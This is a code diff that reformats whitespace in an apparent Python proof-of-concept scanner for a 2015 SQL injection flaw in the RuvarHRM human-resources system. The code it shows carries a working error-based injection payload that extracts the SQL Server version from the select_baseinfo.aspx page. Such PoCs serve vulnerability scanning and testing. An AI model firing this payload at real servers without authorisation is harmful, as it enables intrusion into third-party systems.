@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urlparse
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'RuvarHRM_0001' # 平台漏洞编号，留空
+    vuln_id = 'RuvarHRM_0001'  # 平台漏洞编号，留空
     name = '璐华人力资源管理系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-10-30'  # 漏洞公布时间
     desc = '''  
         璐华人力资源管理系统（RuvarHRM）在 /RuvarHRM/web_include/select_baseinfo.aspx 存在SQL注入漏洞。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'RuvarHRM'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'e1d5725f-9389-4847-b046-cee7cad30b1d'
@@ -32,15 +34,15 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #Refer:http://www.wooyun.org/bugs/wooyun-2015-0150075
+
+            # Refer:http://www.wooyun.org/bugs/wooyun-2015-0150075
             hh = hackhttp.hackhttp()
             arg = self.target
             start_time1 = time.time()
             payload = "/RuvarHRM/web_include/select_baseinfo.aspx?bt_name=1%27)AND%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)%3E0--"
             url = arg + payload
-            code, head, res, errcode,finalurl =  hh.http(url)
-            if  code != 0 and "GAO JI@Microsoft SQL Server" in res:
+            code, head, res, errcode, finalurl = hh.http(url)
+            if code != 0 and "GAO JI@Microsoft SQL Server" in res:
                 #security_hole('find sql injection: ' + arg)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -50,6 +52,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
